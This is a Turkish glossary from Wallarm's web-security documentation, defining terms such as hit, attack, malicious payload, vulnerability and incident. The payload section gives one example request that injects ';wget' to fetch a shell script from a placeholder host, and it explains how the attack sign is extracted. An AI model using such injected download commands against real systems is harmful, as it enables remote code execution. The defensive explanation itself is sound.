# Sözlük

Sözlük, platformu daha iyi anlamanız için çekirdek Wallarm öğelerini kapsar.

## Hit

Hit, serileştirilmiş kötü niyetli bir istektir (filtreleme düğümü tarafından eklenen orijinal kötü niyetli istek ve metadata), örneğin:

![Hit örneği](images/user-guides/events/analyze-attack-raw.png)

[Hit parametreleri hakkında ayrıntılar](user-guides/events/analyze-attack.md#analyze-requests-in-an-event)

## Saldırı

Bir saldırı, aşağıdaki özelliklere göre gruplandırılan tek bir hit veya birden fazla hittir:

* Aynı saldırı türü, kötü niyetli yük taşıyan parametre ve hit'lerin gönderildiği adres. Hit'ler aynı veya farklı IP adreslerinden gelebilir ve bir saldırı türü içinde kötü niyetli yüklerin farklı değerlerine sahip olabilir.

    Bu hit gruplama yöntemi temeldir ve tüm hit'lere uygulanır.
* Uygun [tetikleyici](user-guides/triggers/trigger-examples.md#group-hits-originating-from-the-same-ip-into-one-attack) etkinleştirildiyse aynı kaynak IP adresi. Diğer hit parametre değerleri farklı olabilir.

    Bu hit gruplama yöntemi, Brute force, Forced browsing, BOLA (IDOR), Resource overlimit, Data bomb ve Virtual patch saldırı türlerindeki hit'ler dışında tüm hit'ler için çalışır.

    Hit'ler bu yöntemle gruplandırıldığında, saldırı için [**Yanlış pozitif olarak işaretle**](user-guides/events/false-attack.md#mark-an-attack-as-a-false-positive) düğmesi ve [aktif doğrulama](about-wallarm/detecting-vulnerabilities.md#active-threat-verification) seçeneği kullanılamaz.

Belirtilen hit gruplama yöntemleri birbirini dışlamaz. Hit'lerin her iki yöntemin özelliklerine sahip olması durumunda, hepsi tek bir saldırıya gruplandırılır.

Tek bir hit içeren bir saldırının örneği:

![Tek hit'li saldırı](images/glossary/attack-with-one-hit-example.png)

Birçok hit içeren bir saldırının örneği:

![Birçok hit'li saldırı](images/glossary/attack-with-several-hits-example.png)

## Kötü Niyetli Yük

Aşağıdaki öğeleri içeren orijinal bir istemin bir parçası:

* Bir istekte tespit edilen saldırı işaretleri. Bir istekte aynı saldırı türünü karakterize eden birkaç saldırı işareti tespit edilirse, sadece ilk işaret yüke kaydedilir.
* Saldırı işaretinin bağlamı. Bağlam, tespit edilen saldırı işaretlerinin önünde ve sonunda bulunan bir sembol setidir. Bir yük uzunluğu sınırlı olduğundan, bir saldırı işareti tam yük uzunluğunda ise bağlam atlanabilir.

Örneğin:

* İstek:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Kötü niyetli yük:

    ```bash
    ;wget+http://s
    ```

    Bu yükte, `;wget+` [RCE](attacks-vulns-list.md#remote-code-execution-rce) saldırı işareti ve yükün diğer parçası saldırı işaretinin bağlamıdır.

Saldırı işaretleri [davranışsal saldırıları](about-wallarm/protecting-against-attacks.md#behavioral-attacks) tespit etmek için kullanılmadığından, davranışsal saldırıların bir parçası olarak gönderilen isteklerin boş yükleri vardır.

## Güvenlik Zaafı
Bir güvenlik zaafı, bir web uygulamasını oluştururken veya uygularken ihmalkarlık veya yetersiz bilgi nedeniyle yapılan bir hata olup bilgi güvenliği riskine yol açabilir.

Bilgi güvenliği riskleri:

* Yetkisiz veri erişimi; örneğin, kullanıcı verilerini okuma ve değiştirme erişimi.
* Hizmeti reddetme.
* Veri bozulması ve diğerleri.

Internet trafiği, Wallarm'ın diğer fonksiyonlarının yanı sıra güvenlik zaafiyetlerini tespit etmek için kullanılabilir.

## Güvenlik Olayı

Bir güvenlik olayı, bir güvenlik zaafiyetinin sömürülmesi olayıdır. Bir olay, doğrulanmış bir güvenlik zaafiyetine yönelik bir [saldırı](#attack)'dır.

Bir olay, tıpkı bir saldırı gibi, sisteminizin dışında bir varlık ve dış İnternet'in, sistemin kendisinin değil, bir özelliğidir. Var olan güvenlik zaafiyetlerine yönelik saldırılar azınlık olsa da, bilgi güvenliği açısından son derece önemlidirler. Wallarm var olan güvenlik zaafiyetlerine yönelik saldırıları otomatik olarak tespit eder ve bunları ayrı bir obje - olay - olarak görüntüler.

## Dairesel Tampon
Dairesel tampon, uçtan uca bağlıymış gibi sabit boyutlu tek bir tampon kullanarak veri yapısıdır. 
[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Circular_buffer).

## Özel kural seti (eski terim LOM)

Bir özel kural seti, Wallarm düğümlerinin Wallarm Bulutu'ndan indirdiği derlenmiş güvenlik kurallarının bir setidir.

Özel kurallar, trafik işleme için bireysel kurallar ayarlamanıza olanak sağlar, örneğin:

* Hassas verileri Wallarm Bulutu'na yüklemeden önce maskele
* RegExp tabanlı saldırı göstergeleri oluştur
* Aktif bir güvenlik zaafiyetini sömüren istekleri engelleyen bir sanal yamayı uygula
* Belirli isteklerde saldırı tespitini devre dışı bırak, vb.

Bir özel kural seti varsayılan olarak boş değildir, Bulut'ta kayıtlı tüm müşteriler için oluşturulan kuralları içerir, örneğin [**Ayarlar → Genel** sekmesinde](user-guides/settings/general.md) değeri olan filtreleme modu kuralı.

[Özel kural setleri hakkında daha fazla ayrıntı](user-guides/rules/intro.md)

## Geçersiz İstek
Filtre düğümü tarafından kontrol edilen ve LOM kurallarına uymayan bir istek.

## Ters Proxy
Bir ters proxy, kaynakları bir sunucudan bir istemci adına alıp istemciye kaynakları, sanki kaynaklar Web sunucusundan geliyormuş gibi geri döndüren bir proxy sunucusu tipidir.
[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Reverse_proxy).

## Sertifika Yetkilisi
Bir sertifika yetkilisi, dijital sertifikalar veren bir varlıktır.
[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Certificate_authority).